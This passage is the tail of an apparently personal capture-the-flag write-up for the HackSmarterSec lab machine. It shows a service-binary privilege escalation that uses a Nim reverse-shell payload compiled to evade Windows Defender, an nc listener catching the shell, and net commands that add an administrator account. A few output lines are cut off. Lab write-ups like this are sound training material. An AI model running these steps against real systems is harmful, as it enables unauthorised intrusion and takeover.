+<span class="mi">06</span><span class="o">/</span><span class="mi">30</span><span class="o">/</span><span class="mi">2023</span><span class="w">  </span><span class="mi">07</span><span class="p">:</span><span class="mi">12</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="p">&lt;</span><span class="nx">DIR</span><span class="p">&gt;</span><span class="w">          </span><span class="p">.</span>
+<span class="mi">06</span><span class="o">/</span><span class="mi">30</span><span class="o">/</span><span class="mi">2023</span><span class="w">  </span><span class="mi">07</span><span class="p">:</span><span class="mi">12</span><span class="w"> </span><span class="nx">PM</span><span class="w">    </span><span class="p">&lt;</span><span class="nx">DIR</span><span class="p">&gt;</span><span class="w">          </span><span class="p">..</span>
+<span class="mi">06</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2016</span><span class="w">  </span><span class="mi">03</span><span class="p">:</span><span class="mi">36</span><span class="w"> </span><span class="nx">PM</span><span class="w">               </span><span class="mi">527</span><span class="w"> </span><span class="nx">EC2</span><span class="w"> </span><span class="nx">Feedback</span><span class="p">.</span><span class="nx">website</span>
+<span class="mi">06</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2016</span><span class="w">  </span><span class="mi">03</span><span class="p">:</span><span class="mi">36</span><span class="w"> </span><span class="nx">PM</span><span class="w">               </span><span class="mi">554</span><span class="w"> </span><span class="nx">EC2</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Guide</span><span class="p">.</span><span class="nx">website</span>
+<span class="mi">06</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2023</span><span class="w">  </span><span class="mi">09</span><span class="p">:</span><span class="mi">42</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="mi">25</span><span class="w"> </span><span class="nx">user</span><span class="p">.</span><span class="nx">txt</span>
+<span class="w">               </span><span class="mi">3</span><span class="w"> </span><span class="nx">File</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span><span class="w">          </span><span class="mi">1</span><span class="p">,</span><span class="mi">106</span><span class="w"> </span><span class="nx">bytes</span>
+<span class="w">               </span><span class="mi">2</span><span class="w"> </span><span class="nx">Dir</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span><span class="w">  </span><span class="mi">14</span><span class="p">,</span><span class="mi">088</span><span class="p">,</span><span class="mi">474</span><span class="p">,</span><span class="mi">624</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">free</span>
+
+
+<span class="nx">tyler</span><span class="err">@</span><span class="nx">HACKSMARTERSEC</span><span class="w"> </span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">tyler</span><span class="err">\</span><span class="nx">Desktop</span><span class="p">&gt;</span><span class="k">type</span><span class="w"> </span><span class="nx">user</span><span class="p">.</span><span class="nx">txtr</span><span class="w"> </span>
+<span class="nx">The</span><span class="w"> </span><span class="nx">system</span><span class="w"> </span><span class="nx">cannot</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">specified</span><span class="p">.</span><span class="w"> </span>
+
+<span class="nx">tyler</span><span class="err">@</span><span class="nx">HACKSMARTERSEC</span><span class="w"> </span><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">tyler</span><span class="err">\</span><span class="nx">Desktop</span><span class="p">&gt;</span><span class="k">type</span><span class="w"> </span><span class="nx">user</span><span class="p">.</span><span class="nx">txt</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">OpenManage</span><span class="o">&gt;</span><span class="w"> </span><span class="n">sc</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="n">qc</span><span class="w"> </span><span class="n">spoofer</span><span class="o">-</span><span class="n">scheduler</span>
+<span class="o">[</span><span class="n">SC</span><span class="o">]</span><span class="w"> </span><span class="n">QueryServiceConfig</span><span class="w"> </span><span class="n">SUCCESS</span><span class="w"> </span>
+
+<span class="nl">SERVICE_NAME</span><span class="p">:</span><span class="w"> </span><span class="n">spoofer</span><span class="o">-</span><span class="n">scheduler</span>
+<span class="w">        </span><span class="n">TYPE</span><span class="w">               </span><span class="err">:</span><span class="w"> </span><span class="mi">10</span><span class="w">  </span><span class="n">WIN32_OWN_PROCESS</span>
+<span class="w">        </span><span class="n">START_TYPE</span><span class="w">         </span><span class="err">:</span><span class="w"> </span><span class="mi">2</span><span class="w">   </span><span class="n">AUTO_START</span>
+<span class="w">        </span><span class="n">ERROR_CONTROL</span><span class="w">      </span><span class="err">:</span><span class="w"> </span><span class="mi">1</span><span class="w">   </span><span class="n">NORMAL</span>
+<span class="w">        </span><span class="n">BINARY_PATH_NAME</span><span class="w">   </span><span class="err">:</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Program</span><span class="w"> </span><span class="n">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="err">\</span><span class="n">Spoofer</span><span class="err">\</span><span class="n">spoofer</span><span class="o">-</span><span class="n">scheduler</span><span class="p">.</span><span class="n">exe</span>
+<span class="w">        </span><span class="n">LOAD_ORDER_GROUP</span><span class="w">   </span><span class="err">:</span>
+<span class="w">        </span><span class="n">TAG</span><span class="w">                </span><span class="err">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="n">DISPLAY_NAME</span><span class="w">       </span><span class="err">:</span><span class="w"> </span><span class="n">Spoofer</span><span class="w"> </span><span class="n">Scheduler</span>
+<span class="w">        </span><span class="n">DEPENDENCIES</span><span class="w">       </span><span class="err">:</span><span class="w"> </span><span class="n">tcpip</span>
+<span class="w">        </span><span class="n">SERVICE_START_NAME</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">LocalSystem</span>
+<span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">OpenManage</span><span class="o">&gt;</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>     53       7     1596       4440              4040   0 spoofer-scheduler  
+</code></pre></div>
+
+<blockquote>
+<p>use nim payload to bypass windows defender</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>nim C -d:mingw --app:gui --opt:speed -o:spoofer-scheduler.exe rev.nim
+</code></pre></div>
+
+<blockquote>
+<p>get that to victim machine and start so can get another reverse shell with administrators privisec</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="err">└─$</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">nvlp</span><span class="w"> </span><span class="mi">8080</span><span class="w">                               </span>
+<span class="n">listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">any</span><span class="o">]</span><span class="w"> </span><span class="mi">8080</span><span class="w"> </span><span class="p">...</span>
+<span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">10.21.16.42</span><span class="o">]</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="err">[</span><span class="mf">10.201</span><span class="p">.</span>
+<span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">luke</span><span class="w"> </span><span class="n">P</span><span class="nv">@ssw0rd</span><span class="err">!</span><span class="mi">123</span><span class="w"> </span>
+<span class="n">net</span><span class="w"> </span><span class="n">localgroup</span><span class="w"> </span><span class="ss">&quot;Administrators&quot;</span><span class="w"> </span><span class="n">luke</span><span class="w"> </span><span class="o">/</span><span class="n">addThe</span><span class="w"> </span><span class="n">comy</span><span class="p">.</span>
+
+
+<span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">completed</span><span class="w"> </span><span class="n">succe</span>
+
+<span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span>
+</code></pre></div>
+
+<blockquote>
+<p>after adding usr to that administrators group login wia ssh and get txt</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>PS C:\Users\Administrator&gt; cd Desktop
+PS C:\Users\Administrator\Desktop&gt; ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        6/30/2023   6:40 PM                Hacking-Targets
+-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
+-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
+
+
+PS C:\Users\Administrator\Desktop&gt; cd Hacking-Targets
+PS C:\Users\Administrator\Desktop\Hacking-Targets&gt; ls
+
+
+    Directory: C:\Users\Administrator\Desktop\Hacking-Targets
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/27/2023   9:40 AM             53 hacking-targets.txt
+
+
+PS C:\Users\Administrator\Desktop\Hacking-Targets&gt; cat hacking-targets.txt
+</code></pre></div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
